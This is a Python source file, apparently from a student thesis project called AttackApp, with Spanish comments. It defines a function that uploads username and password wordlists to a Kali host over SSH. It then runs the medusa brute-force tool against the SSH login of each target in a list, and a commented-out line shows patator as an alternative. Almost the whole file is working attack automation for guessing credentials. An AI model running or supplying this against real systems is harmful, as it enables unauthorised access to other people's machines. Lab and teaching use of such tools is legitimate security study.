
from scanPorts import *
from updateFile import *
from GUISSHAttackDisplay import *

#Lo primero que es necesario realizar es un escaneo de puertos con nmap, para obtener la IP de las RaspBerry Pi que tengan servidores apache2

def sshAttack(ssh, targets, sistema, usernarme_dict = "", password_dict = "", GUI = None):
    '''
    :param ssh: Recibe una conexión ssh activa
    :param targets: Recibe una lista de objetivos a atacar
    :param sistema: Recibe el tipo de sistema operativo
    :param usernarme_dict: Recibe una dirección al diccionario de usuarios que se quiere usar, en caso de no recibirla se utilizará el que viene por defecto
    :param password_dict:  Recibe una dirección al diccionario de contraseñas que se quiere usar, en caso de no recibirla se utilizará el que viene por defecto
    :param GUI: Recibe una dirección a la interfáz gráfica principal de la aplicación, en caso de utilizarla
    :return: No devuelve nada
    '''

    if(usernarme_dict == ""):
        usernarme_dict = "/home/kali/Documents/Diccionarios/usernames.txt"
    if(password_dict == ""):
        password_dict = "/home/kali/Documents/Diccionarios/passwords.txt"

    ruta_usernames = "C:\\Users\\Aru-kun\\Documents\\TFG\\Scripts Python\\AttackApp\\Diccionarios\\usernames.txt"
    ruta_passwords = "C:\\Users\\Aru-kun\\Documents\\TFG\\Scripts Python\\AttackApp\\Diccionarios\\passwords.txt"


    updateFile(ssh, ruta_origen=ruta_usernames, sistema=sistema, ruta_destino=usernarme_dict)
    updateFile(ssh, ruta_origen=ruta_passwords, sistema=sistema, ruta_destino=password_dict)
    print("He cargado los archivos")

    #print("patator ssh_login host=" + target + " user=FILE0 0=" + usernarme_dict + " password=FILE1 1=" + password_dict)
   # stdin, stdout, stderr = ssh.exec_command("patator ssh_login host=" + target + " user=FILE0 0=" + usernarme_dict + " password=FILE1 1=" + password_dict + " -x ignore:msg='Authentication failed.'")

    for target in targets:
        print("targets = "+ target)
        print("medusa -h " + target + " -U " + usernarme_dict + " -P" + password_dict + " -M ssh -f -v 6")

        stdin, stdout, stderr = ssh.exec_command(
            "medusa -h " + target + " -U " + usernarme_dict + " -P" + password_dict + " -M ssh -f -v 6")

        if (GUI != None):
            imprimirSSHAttackGUI(GUI, stdout)
        else:
            for line in stdout:
                salida = "'... '" + line.strip('\n')
                print(salida)

    ssh.close()

    print("He terminado de ejecutar el ataque")


'''
#DUDAS:

#Barra progreso
#Radio buttoms
#Corregir que se imprima 3 veces la pantalla
'''